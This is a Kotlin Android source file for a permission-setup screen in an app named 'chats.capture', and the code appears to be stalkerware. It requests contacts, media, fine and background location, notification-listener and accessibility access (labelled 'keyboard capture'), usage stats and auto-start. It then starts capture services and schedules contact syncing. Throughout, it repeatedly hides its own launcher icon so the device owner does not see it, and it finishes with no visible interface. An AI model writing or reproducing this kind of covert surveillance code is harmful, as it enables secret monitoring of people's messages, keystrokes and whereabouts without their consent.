package com.chats.capture.ui

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.app.AppOpsManager
import android.Manifest
import android.content.pm.PackageManager
import com.chats.capture.R
import com.chats.capture.managers.AutoStartManager
import com.chats.capture.managers.BatteryOptimizationManager
import com.chats.capture.managers.ServiceMonitor
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppStateManager
import com.chats.capture.utils.AppVisibilityManager
import com.chats.capture.utils.InstallationTracker
import com.chats.capture.utils.PermissionChecker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import timber.log.Timber

/**
 * Activity that automatically requests all required permissions
 * Runs automatically on app install/start
 */
class PermissionSetupActivity : AppCompatActivity() {
    
    private lateinit var serviceMonitor: ServiceMonitor
    private lateinit var batteryOptimizationManager: BatteryOptimizationManager
    
    private var isAutoStart = false
    
    // UI Views
    private lateinit var tvPermissionsStatus: android.widget.TextView
    private lateinit var tvSpecialStatus: android.widget.TextView
    private lateinit var tvHideStatus: android.widget.TextView
    private lateinit var btnRequestPermissions: android.widget.Button
    private lateinit var btnSpecialPermissions: android.widget.Button
    private lateinit var btnHideApp: android.widget.Button
    private lateinit var btnStartServices: android.widget.Button
    private lateinit var btnFinishSetup: android.widget.Button
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        isAutoStart = intent.getBooleanExtra("auto_start", false)
        
        serviceMonitor = ServiceMonitor(this)
        batteryOptimizationManager = BatteryOptimizationManager(this)
        
        Timber.d("PermissionSetupActivity started - auto_start: $isAutoStart")
        
        // Track installation
        if (InstallationTracker.isFirstRun(this)) {
            Timber.d("First run after installation")
        }
        
        // Set content view - show visible UI for permission setup
        setContentView(R.layout.activity_permission_setup)
        
        // Initialize UI components
        initializeViews()
        
        // Update permission status
        updatePermissionStatus()
        
        // Auto-start permission requests if auto_start flag is set
        if (isAutoStart) {
            // Auto-start after short delay
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
        requestPermissionsSequentially()
            }, 1000)
        }
    }
    
    companion object {
        private const val REQUEST_POST_NOTIFICATIONS = 1001
        private const val REQUEST_READ_MEDIA_IMAGES = 1002
        private const val REQUEST_READ_MEDIA_VIDEO = 1003
        private const val REQUEST_READ_EXTERNAL_STORAGE = 1004
        private const val REQUEST_READ_CONTACTS = 1005
        private const val REQUEST_LOCATION_PERMISSIONS = 1006
        private const val REQUEST_BACKGROUND_LOCATION = 1007
    }
    
    private var currentPermissionIndex = 0
    private val permissionsQueue = mutableListOf<PermissionRequest>()
    
    private data class PermissionRequest(
        val permission: String,
        val requestCode: Int,
        val name: String
    )
    
    private fun requestPermissionsSequentially() {
        CoroutineScope(Dispatchers.Main).launch {
            try {
                // Build permissions queue
                buildPermissionsQueue()
                
                // Request permissions one by one
                requestNextPermission()
                
                // Special permissions (Notification, Accessibility, etc.) will be requested
                // after all runtime permissions are granted (handled in onRequestPermissionsResult)
                
            } catch (e: Exception) {
                Timber.e(e, "Error in permission setup")
                finish()
            }
        }
    }
    
    private fun requestNotificationAccess() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }
    
    private fun requestAccessibilityService() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }
    
    private fun buildPermissionsQueue() {
        permissionsQueue.clear()
        currentPermissionIndex = 0
        
        // POST_NOTIFICATIONS (Android 13+)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsQueue.add(PermissionRequest(
                    Manifest.permission.POST_NOTIFICATIONS,
                    REQUEST_POST_NOTIFICATIONS,
                    "Notifications"
                ))
            }
        }
        
        // READ_MEDIA_IMAGES (Android 13+)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsQueue.add(PermissionRequest(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    REQUEST_READ_MEDIA_IMAGES,
                    "Photos & Media"
                ))
            }
        }
        
        // READ_MEDIA_VIDEO (Android 13+)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsQueue.add(PermissionRequest(
                    Manifest.permission.READ_MEDIA_VIDEO,
                    REQUEST_READ_MEDIA_VIDEO,
                    "Videos"
                ))
            }
        }
        
        // READ_EXTERNAL_STORAGE (Android 12 and below)
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsQueue.add(PermissionRequest(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    REQUEST_READ_EXTERNAL_STORAGE,
                    "Storage"
                ))
            }
        }
        
        // READ_CONTACTS (for contact capture)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) 
            != PackageManager.PERMISSION_GRANTED) {
            permissionsQueue.add(PermissionRequest(
                Manifest.permission.READ_CONTACTS,
                REQUEST_READ_CONTACTS,
                "Contacts"
            ))
        }
        
        Timber.d("Permissions queue built: ${permissionsQueue.size} permissions to request")
    }
    
    private fun requestNextPermission() {
        // Force hide app before requesting next permission
        forceHideAppFromLauncher()
        
        if (currentPermissionIndex >= permissionsQueue.size) {
            Timber.d("All runtime permissions processed, continuing with location permissions")
            // All runtime permissions done, continue with location permissions
            CoroutineScope(Dispatchers.Main).launch {
                delay(1000)
                requestLocationPermissions()
            }
            return
        }
        
        val permissionRequest = permissionsQueue[currentPermissionIndex]
        Timber.d("Requesting permission ${currentPermissionIndex + 1}/${permissionsQueue.size}: ${permissionRequest.name}")
        
            ActivityCompat.requestPermissions(
                this,
            arrayOf(permissionRequest.permission),
            permissionRequest.requestCode
        )
    }
    
    private fun forceHideAppFromLauncher() {
        try {
            // Multiple attempts to ensure it sticks
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.hide(this)
            AppHider.ensureHidden(this)
            
            // Also try with application context
            val appContext = applicationContext
            AppVisibilityManager.hideFromLauncher(appContext)
            AppHider.hide(appContext)
            AppHider.ensureHidden(appContext)
            
            Timber.d("Force hide app from launcher executed")
        } catch (e: Exception) {
            Timber.e(e, "Error in force hide app")
        }
    }
    
    private fun requestLocationPermissions() {
        // Request location permissions one by one
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            Timber.d("Requesting location permission: ACCESS_FINE_LOCATION")
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
                REQUEST_LOCATION_PERMISSIONS
            )
        } else if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            Timber.d("Requesting location permission: ACCESS_COARSE_LOCATION")
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION),
                REQUEST_LOCATION_PERMISSIONS + 1 // Use different code
            )
        } else {
            // Both location permissions granted, request background location
            requestBackgroundLocationPermission()
        }
    }
    
    private fun requestBackgroundLocationPermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) 
                != PackageManager.PERMISSION_GRANTED) {
                Timber.d("Requesting background location permission")
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION),
                    REQUEST_BACKGROUND_LOCATION
                )
            } else {
                Timber.d("Background location permission already granted")
            }
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        val granted = grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
        val permissionName = permissions.firstOrNull() ?: "unknown"
        
        Timber.d("Permission result: $permissionName = ${if (granted) "GRANTED" else "DENIED"}")
        
        when (requestCode) {
            REQUEST_POST_NOTIFICATIONS,
            REQUEST_READ_MEDIA_IMAGES,
            REQUEST_READ_MEDIA_VIDEO,
            REQUEST_READ_EXTERNAL_STORAGE,
            REQUEST_READ_CONTACTS -> {
                // Handle runtime permission result one by one
                if (granted) {
                    Timber.d("Permission granted: $permissionName")
                } else {
                    Timber.w("Permission denied: $permissionName")
                }
                
                // Force hide app from launcher immediately after each permission
                forceHideAppFromLauncher()
                
                // Move to next permission in queue
                currentPermissionIndex++
                
                // Update UI
                updatePermissionStatus()
                
                // Request next permission after a short delay
                CoroutineScope(Dispatchers.Main).launch {
                    delay(500) // Small delay between permissions
                    requestNextPermission()
                }
            }
            REQUEST_LOCATION_PERMISSIONS -> {
                // Force hide app after location permission
                forceHideAppFromLauncher()
                
                if (granted) {
                    Timber.d("Fine location permission granted")
                    // Request coarse location next
                    CoroutineScope(Dispatchers.Main).launch {
                        delay(500)
                        if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.ACCESS_COARSE_LOCATION) 
                            != PackageManager.PERMISSION_GRANTED) {
                            ActivityCompat.requestPermissions(
                                this@PermissionSetupActivity,
                                arrayOf(Manifest.permission.ACCESS_COARSE_LOCATION),
                                REQUEST_LOCATION_PERMISSIONS + 1
                            )
                        } else {
                            requestBackgroundLocationPermission()
                        }
                    }
                } else {
                    Timber.w("Fine location permission denied")
                    // Continue with special permissions even if location denied
                    continueWithSpecialPermissions()
                }
            }
            REQUEST_LOCATION_PERMISSIONS + 1 -> {
                // Force hide app after location permission
                forceHideAppFromLauncher()
                
                if (granted) {
                    Timber.d("Coarse location permission granted")
                    requestBackgroundLocationPermission()
                } else {
                    Timber.w("Coarse location permission denied")
                    continueWithSpecialPermissions()
                }
            }
            REQUEST_BACKGROUND_LOCATION -> {
                // Force hide app after background location permission
                forceHideAppFromLauncher()
                
                if (granted) {
                    Timber.d("Background location permission granted")
                } else {
                    Timber.w("Background location permission denied")
                }
                // Continue with special permissions after location
                continueWithSpecialPermissions()
            }
        }
    }
    
    private fun requestUsageStatsPermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)
        }
    }
    
    private fun isNotificationServiceEnabled(): Boolean {
        return PermissionChecker.isNotificationServiceEnabled(this)
    }
    
    private fun isAccessibilityServiceEnabled(): Boolean {
        return PermissionChecker.isAccessibilityServiceEnabled(this)
    }
    
    private fun startServices() {
        // Start notification capture service using utility
        com.chats.capture.utils.ServiceStarter.startNotificationService(this)
        
        // Start keyboard capture service (via accessibility)
        // This will start automatically when accessibility service is enabled
        
        // Start service monitoring
        serviceMonitor.startMonitoring()
        
        // Ensure services remain running
        com.chats.capture.utils.ServiceStarter.ensureServicesRunning(this)
    }
    
    private fun isUsageStatsPermissionGranted(): Boolean {
        return try {
            val appOps = getSystemService(APP_OPS_SERVICE) as AppOpsManager
            val mode = appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )
            mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) {
            false
        }
    }
    
    private fun continueWithSpecialPermissions() {
        // Force hide app before requesting special permissions
        forceHideAppFromLauncher()
        
        CoroutineScope(Dispatchers.Main).launch {
            delay(1000)
            
            // 1. Request Notification Access (Special Permission)
            if (!isNotificationServiceEnabled()) {
                Timber.d("Requesting Notification Access")
                forceHideAppFromLauncher() // Hide before opening Settings
                requestNotificationAccess()
                delay(2000) // Wait for user to grant permission
                forceHideAppFromLauncher() // Hide after returning from Settings
            }
            
            // 2. Request Accessibility Service (Special Permission)
            if (!isAccessibilityServiceEnabled()) {
                Timber.d("Requesting Accessibility Service")
                forceHideAppFromLauncher() // Hide before opening Settings
                requestAccessibilityService()
                delay(2000) // Wait for user to grant permission
                forceHideAppFromLauncher() // Hide after returning from Settings
            }
            
            // 3. Request Battery Optimization Exemption
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                if (!batteryOptimizationManager.isIgnoringBatteryOptimizations()) {
                    Timber.d("Requesting Battery Optimization Exemption")
                    forceHideAppFromLauncher() // Hide before opening Settings
                    batteryOptimizationManager.requestBatteryOptimizationExemption()?.let {
                        startActivity(it)
                        delay(2000)
                        forceHideAppFromLauncher() // Hide after returning from Settings
                    }
                }
            }
            
            // 4. Request Usage Stats Permission (for app usage monitoring)
            if (!isUsageStatsPermissionGranted()) {
                forceHideAppFromLauncher() // Hide before opening Settings
                requestUsageStatsPermission()
                delay(1000)
                forceHideAppFromLauncher() // Hide after returning from Settings
            } else {
                Timber.d("Usage Stats permission already granted")
            }
            
            // 5. Request Auto-Start Permission (manufacturer-specific)
            if (!AutoStartManager.isAutoStartEnabled(this@PermissionSetupActivity)) {
                Timber.d("Requesting Auto-Start Permission")
                forceHideAppFromLauncher() // Hide before opening Settings
                AutoStartManager.requestAutoStartPermission(this@PermissionSetupActivity)?.let {
                    startActivity(it)
                    delay(2000)
                    forceHideAppFromLauncher() // Hide after returning from Settings
                }
            } else {
                Timber.d("Auto-Start already enabled")
            }
            
            // 6. Start services
            Timber.d("Starting services")
            startServices()
            
            // 7. Schedule background work
            scheduleBackgroundWork()
            
            // 8. Mark setup as complete
            AppStateManager.markSetupComplete(this@PermissionSetupActivity)
            AppStateManager.setServicesEnabled(this@PermissionSetupActivity, true)
            
            // 9. Hide this activity and finish silently
            Timber.d("Permission setup complete - hiding app")
            
            // Force hide app multiple times to ensure it sticks
            for (i in 1..5) {
                forceHideAppFromLauncher()
                delay(200)
            }
            
            // Also schedule delayed hides
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                forceHideAppFromLauncher()
            }, 2000)
            
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                forceHideAppFromLauncher()
            }, 5000)
            
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                forceHideAppFromLauncher()
            }, 10000)
            
            // Start MainActivity in background (will finish immediately)
            val mainIntent = Intent(this@PermissionSetupActivity, MainActivity::class.java)
            mainIntent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(mainIntent)
            
            // Finish immediately - no UI should be shown
            finish()
        }
    }
    
    private fun scheduleBackgroundWork() {
        // Schedule app hider worker to ensure app stays hidden
        com.chats.capture.workers.AppHiderScheduler.schedule(this)
        
        // Schedule daily contact sync
        com.chats.capture.workers.ContactSyncScheduler.scheduleDailySync(this)
        
        // Sync scheduler and update checker will be scheduled by MainActivity
    }
    
    override fun onResume() {
        super.onResume()
        // Update UI when user returns from Settings
        updatePermissionStatus()
    }
    
    override fun onPause() {
        super.onPause()
        // Hide app when activity pauses
        forceHideAppFromLauncher()
    }
    
    /**
     * Initialize UI views from layout
     */
    private fun initializeViews() {
        tvPermissionsStatus = findViewById(R.id.tv_permissions_status)
        tvSpecialStatus = findViewById(R.id.tv_special_status)
        tvHideStatus = findViewById(R.id.tv_hide_status)
        btnRequestPermissions = findViewById(R.id.btn_request_permissions)
        btnSpecialPermissions = findViewById(R.id.btn_special_permissions)
        btnHideApp = findViewById(R.id.btn_hide_app)
        btnStartServices = findViewById(R.id.btn_start_services)
        btnFinishSetup = findViewById(R.id.btn_finish_setup)
        
        // Setup button listeners
        btnRequestPermissions.setOnClickListener {
            requestPermissionsSequentially()
        }
        
        btnSpecialPermissions.setOnClickListener {
            continueWithSpecialPermissions()
        }
        
        btnHideApp.setOnClickListener {
            forceHideAppFromLauncher()
            updatePermissionStatus()
        }
        
        btnStartServices.setOnClickListener {
            startServices()
        }
        
        btnFinishSetup.setOnClickListener {
            AppStateManager.markSetupComplete(this)
            AppStateManager.setServicesEnabled(this, true)
            finish()
        }
    }
    
    /**
     * Update permission status in UI
     */
    private fun updatePermissionStatus() {
        try {
            // Update runtime permissions status
            val runtimePermissionsStatus = buildString {
                val permissions = mutableListOf<String>()
                
                // Check POST_NOTIFICATIONS (Android 13+)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                    if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.POST_NOTIFICATIONS) 
                        == PackageManager.PERMISSION_GRANTED) {
                        permissions.add("✓ Notifications")
                    } else {
                        permissions.add("✗ Notifications")
                    }
                }
                
                // Check READ_MEDIA_IMAGES (Android 13+)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                    if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.READ_MEDIA_IMAGES) 
                        == PackageManager.PERMISSION_GRANTED) {
                        permissions.add("✓ Photos")
                    } else {
                        permissions.add("✗ Photos")
                    }
                } else {
                    // READ_EXTERNAL_STORAGE for older versions
                    if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.READ_EXTERNAL_STORAGE) 
                        == PackageManager.PERMISSION_GRANTED) {
                        permissions.add("✓ Storage")
                    } else {
                        permissions.add("✗ Storage")
                    }
                }
                
                // Check READ_CONTACTS
                if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.READ_CONTACTS) 
                    == PackageManager.PERMISSION_GRANTED) {
                    permissions.add("✓ Contacts")
                } else {
                    permissions.add("✗ Contacts")
                }
                
                // Check location permissions
                if (ContextCompat.checkSelfPermission(this@PermissionSetupActivity, Manifest.permission.ACCESS_FINE_LOCATION) 
                    == PackageManager.PERMISSION_GRANTED) {
                    permissions.add("✓ Location")
                } else {
                    permissions.add("✗ Location")
                }
                
                append(permissions.joinToString("\n"))
            }
            
            tvPermissionsStatus.text = runtimePermissionsStatus
            
            // Update special permissions status
            val specialPermissionsStatus = buildString {
                val statuses = mutableListOf<String>()
                
                if (isNotificationServiceEnabled()) {
                    statuses.add("✓ Notification Access")
                } else {
                    statuses.add("✗ Notification Access")
                }
                
                if (isAccessibilityServiceEnabled()) {
                    statuses.add("✓ Accessibility Service")
                } else {
                    statuses.add("✗ Accessibility Service")
                }
                
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    if (batteryOptimizationManager.isIgnoringBatteryOptimizations()) {
                        statuses.add("✓ Battery Optimization")
                    } else {
                        statuses.add("✗ Battery Optimization")
                    }
                }
                
                if (isUsageStatsPermissionGranted()) {
                    statuses.add("✓ Usage Stats")
                } else {
                    statuses.add("✗ Usage Stats")
                }
                
                if (AutoStartManager.isAutoStartEnabled(this@PermissionSetupActivity)) {
                    statuses.add("✓ Auto-Start")
                } else {
                    statuses.add("✗ Auto-Start")
                }
                
                append(statuses.joinToString("\n"))
            }
            
            tvSpecialStatus.text = specialPermissionsStatus
            
            // Update hide app status
            // Check if app is hidden (this is a simple check, actual implementation may vary)
            val packageManager = packageManager
            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            if (launchIntent != null) {
                tvHideStatus.text = "App is visible in app drawer"
            } else {
                tvHideStatus.text = "App is hidden from app drawer"
            }
            
        } catch (e: Exception) {
            Timber.e(e, "Error updating permission status")
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        // Ensure app is hidden from launcher
        forceHideAppFromLauncher()
        
        // Schedule multiple delayed hides to ensure it sticks
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            forceHideAppFromLauncher()
        }, 1000)
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            forceHideAppFromLauncher()
        }, 3000)
        
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            forceHideAppFromLauncher()
        }, 5000)
    }
}
